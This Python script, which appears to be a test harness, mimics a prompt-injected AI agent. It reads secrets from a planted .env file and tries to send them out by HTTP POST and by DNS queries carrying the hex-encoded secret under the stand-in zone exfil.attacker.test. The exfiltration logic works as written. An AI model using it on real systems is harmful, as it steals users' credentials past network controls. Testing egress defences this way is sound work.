#!/usr/bin/env python3
"""A mock prompt-injected agent: it reads secrets from a planted .env and
tries to send them out over two channels.

  1. HTTP POST to an unlisted address (the "attacker" listener).
  2. DNS: the secret, hex-encoded, as labels of a query name, which a
     resolver would forward to the attacker's nameserver.

It reports what happened on each channel and never raises.
"""

import argparse
import socket
import urllib.request


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--env", required=True, help="path to the planted .env")
    ap.add_argument("--url", required=True, help="exfiltration endpoint")
    ap.add_argument("--dns-zone", default="exfil.attacker.test")
    args = ap.parse_args()

    with open(args.env, "rb") as f:
        secrets = f.read()
    print(f"agent: read {len(secrets)} bytes from {args.env}")

    try:
        req = urllib.request.Request(args.url, data=secrets, method="POST")
        with urllib.request.urlopen(req, timeout=5) as resp:
            print(f"agent: HTTP POST {args.url} -> {resp.status} {resp.read().decode().strip()!r}")
    except Exception as e:  # noqa: BLE001 - the demo reports every failure mode
        print(f"agent: HTTP POST {args.url} failed: {e}")

    label = secrets.hex()[:60]
    name = f"{label}.{args.dns_zone}"
    try:
        addr = socket.gethostbyname(name)
        print(f"agent: DNS lookup of {name} -> {addr}")
    except Exception as e:  # noqa: BLE001
        print(f"agent: DNS lookup of {name} failed: {e}")


if __name__ == "__main__":
    main()
